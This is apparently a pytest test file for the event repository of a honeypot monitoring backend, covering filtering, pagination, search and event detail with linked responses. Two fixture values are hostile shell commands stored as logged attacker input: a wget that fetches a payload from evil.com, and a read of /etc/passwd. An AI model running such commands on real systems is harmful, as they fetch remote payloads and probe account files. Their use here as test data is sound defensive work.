"""Repository tests for events.py (tasks 3.1, 3.2, 3.8)."""

from datetime import datetime, timezone

import pytest

from app.repositories import events as repo
from tests.conftest import insert_event, insert_response


@pytest.mark.asyncio
async def test_list_events_returns_all_ordered_by_timestamp_desc(conn):
    await insert_event(conn, timestamp="2026-01-01T10:00:00+00:00", src_ip="1.1.1.1")
    await insert_event(conn, timestamp="2026-01-01T12:00:00+00:00", src_ip="2.2.2.2")
    await insert_event(conn, timestamp="2026-01-01T11:00:00+00:00", src_ip="3.3.3.3")

    items = await repo.list_events(conn, {}, page=1, page_size=10)

    assert len(items) == 3
    assert [i["src_ip"] for i in items] == ["2.2.2.2", "3.3.3.3", "1.1.1.1"]


@pytest.mark.asyncio
async def test_list_events_pagination(conn):
    for i in range(5):
        await insert_event(conn, src_ip=f"10.0.0.{i}")

    page1 = await repo.list_events(conn, {}, page=1, page_size=2)
    page3 = await repo.list_events(conn, {}, page=3, page_size=2)

    assert len(page1) == 2
    assert len(page3) == 1


@pytest.mark.asyncio
async def test_pagination_out_of_range_returns_empty_and_total_real(conn):
    for i in range(3):
        await insert_event(conn, src_ip=f"10.0.0.{i}")

    items = await repo.list_events(conn, {}, page=99, page_size=10)
    total = await repo.count_events(conn, {})

    assert items == []
    assert total == 3


@pytest.mark.asyncio
async def test_filter_by_source_honeypot_and_protocol(conn):
    await insert_event(conn, source_honeypot="cowrie", protocol="ssh")
    await insert_event(conn, source_honeypot="cowrie", protocol="telnet")
    await insert_event(conn, source_honeypot="dionaea", protocol="smb")

    filters = {"source_honeypot": "cowrie", "protocol": "ssh"}
    items = await repo.list_events(conn, filters, page=1, page_size=10)

    assert len(items) == 1
    assert items[0]["source_honeypot"] == "cowrie"
    assert items[0]["protocol"] == "ssh"


@pytest.mark.asyncio
async def test_filter_by_src_ip(conn):
    await insert_event(conn, src_ip="5.5.5.5")
    await insert_event(conn, src_ip="6.6.6.6")

    items = await repo.list_events(conn, {"src_ip": "5.5.5.5"}, page=1, page_size=10)

    assert len(items) == 1
    assert items[0]["src_ip"] == "5.5.5.5"


@pytest.mark.asyncio
async def test_filter_by_date_range(conn):
    await insert_event(conn, timestamp="2026-01-01T10:00:00+00:00", src_ip="1.1.1.1")
    await insert_event(conn, timestamp="2026-02-01T10:00:00+00:00", src_ip="2.2.2.2")
    await insert_event(conn, timestamp="2026-03-01T10:00:00+00:00", src_ip="3.3.3.3")

    filters = {
        "from_": datetime(2026, 1, 15, tzinfo=timezone.utc),
        "to": datetime(2026, 2, 28, 23, 59, 59, tzinfo=timezone.utc),
    }
    items = await repo.list_events(conn, filters, page=1, page_size=10)

    assert len(items) == 1
    assert items[0]["src_ip"] == "2.2.2.2"


@pytest.mark.asyncio
async def test_filter_by_severity_bucket(conn):
    await insert_event(conn, risk_score=0.10, src_ip="1.1.1.1")   # low
    await insert_event(conn, risk_score=0.50, src_ip="2.2.2.2")   # medium
    await insert_event(conn, risk_score=0.70, src_ip="3.3.3.3")   # high
    await insert_event(conn, risk_score=0.90, src_ip="4.4.4.4")   # critical

    critical = await repo.list_events(conn, {"severity": "critical"}, page=1, page_size=10)
    medium = await repo.list_events(conn, {"severity": "medium"}, page=1, page_size=10)
    low = await repo.list_events(conn, {"severity": "low"}, page=1, page_size=10)

    assert [i["src_ip"] for i in critical] == ["4.4.4.4"]
    assert [i["src_ip"] for i in medium] == ["2.2.2.2"]
    assert [i["src_ip"] for i in low] == ["1.1.1.1"]


@pytest.mark.asyncio
async def test_filter_by_technique(conn):
    await insert_event(conn, att_ck_technique="T1059", src_ip="1.1.1.1")
    await insert_event(conn, att_ck_technique="T1190", src_ip="2.2.2.2")

    items = await repo.list_events(conn, {"technique": "T1059"}, page=1, page_size=10)

    assert len(items) == 1
    assert items[0]["att_ck_technique"] == "T1059"


@pytest.mark.asyncio
async def test_filter_by_username(conn):
    await insert_event(conn, username="root", src_ip="1.1.1.1")
    await insert_event(conn, username="admin", src_ip="2.2.2.2")

    items = await repo.list_events(conn, {"username": "root"}, page=1, page_size=10)

    assert len(items) == 1
    assert items[0]["username"] == "root"


@pytest.mark.asyncio
async def test_search_on_commands(conn):
    await insert_event(conn, commands="wget http://evil.com/payload.sh", src_ip="1.1.1.1")
    await insert_event(conn, commands="ls -la", src_ip="2.2.2.2")

    items = await repo.list_events(conn, {"search": "wget"}, page=1, page_size=10)

    assert len(items) == 1
    assert items[0]["src_ip"] == "1.1.1.1"


@pytest.mark.asyncio
async def test_search_on_raw_data(conn):
    await insert_event(
        conn, raw_data={"eventid": "cowrie.command.input", "message": "cat /etc/passwd"},
        src_ip="1.1.1.1",
    )
    await insert_event(conn, src_ip="2.2.2.2")

    items = await repo.list_events(conn, {"search": "passwd"}, page=1, page_size=10)

    assert len(items) == 1
    assert items[0]["src_ip"] == "1.1.1.1"


@pytest.mark.asyncio
async def test_combined_filters(conn):
    await insert_event(
        conn, source_honeypot="cowrie", protocol="ssh", risk_score=0.9,
        att_ck_technique="T1190", username="root", src_ip="8.8.8.8",
    )
    await insert_event(
        conn, source_honeypot="cowrie", protocol="ssh", risk_score=0.9,
        att_ck_technique="T1190", username="admin", src_ip="8.8.8.9",
    )
    await insert_event(
        conn, source_honeypot="dionaea", protocol="smb", risk_score=0.9,
        att_ck_technique="T1190", username="root", src_ip="8.8.8.8",
    )

    filters = {
        "source_honeypot": "cowrie",
        "protocol": "ssh",
        "severity": "critical",
        "technique": "T1190",
        "username": "root",
    }
    items = await repo.list_events(conn, filters, page=1, page_size=10)

    assert len(items) == 1
    assert items[0]["src_ip"] == "8.8.8.8"


@pytest.mark.asyncio
async def test_count_events_matches_filters(conn):
    await insert_event(conn, source_honeypot="cowrie", src_ip="1.1.1.1")
    await insert_event(conn, source_honeypot="dionaea", src_ip="2.2.2.2")

    assert await repo.count_events(conn, {}) == 2
    assert await repo.count_events(conn, {"source_honeypot": "cowrie"}) == 1
    assert await repo.count_events(conn, {"source_honeypot": "dionaea"}) == 1


@pytest.mark.asyncio
async def test_list_events_zero_rows(conn):
    items = await repo.list_events(conn, {}, page=1, page_size=10)
    total = await repo.count_events(conn, {})
    assert items == []
    assert total == 0


@pytest.mark.asyncio
async def test_event_row_has_typed_fields(conn):
    await insert_event(
        conn,
        src_ip="7.7.7.7",
        risk_score=0.75,
        enrichment_data={"country": "AR"},
        raw_data={"src_ip": "7.7.7.7"},
    )
    row = (await repo.list_events(conn, {}, page=1, page_size=10))[0]
    assert row["id"] > 0
    assert row["src_ip"] == "7.7.7.7"
    assert row["risk_score"] == 0.75
    assert row["enrichment_data"] == {"country": "AR"}
    assert row["raw_data"] == {"src_ip": "7.7.7.7"}


@pytest.mark.asyncio
async def test_get_event_by_id_returns_full_event_with_responses(conn):
    ev = await insert_event(conn, src_ip="9.9.9.9", commands="whoami")
    await insert_response(conn, event_id=ev["id"], action_type="bloqueo", status="completed")
    await insert_response(conn, event_id=ev["id"], action_type="alerta", status="pending")

    detail = await repo.get_event_by_id(conn, ev["id"])

    assert detail is not None
    assert detail["id"] == ev["id"]
    assert detail["src_ip"] == "9.9.9.9"
    assert detail["commands"] == "whoami"
    assert len(detail["responses"]) == 2
    actions = {r["action_type"] for r in detail["responses"]}
    assert actions == {"bloqueo", "alerta"}


@pytest.mark.asyncio
async def test_get_event_by_id_missing_returns_none(conn):
    assert await repo.get_event_by_id(conn, 999999) is None


@pytest.mark.asyncio
async def test_get_event_by_id_responses_empty_when_none(conn):
    ev = await insert_event(conn)
    detail = await repo.get_event_by_id(conn, ev["id"])
    assert detail["responses"] == []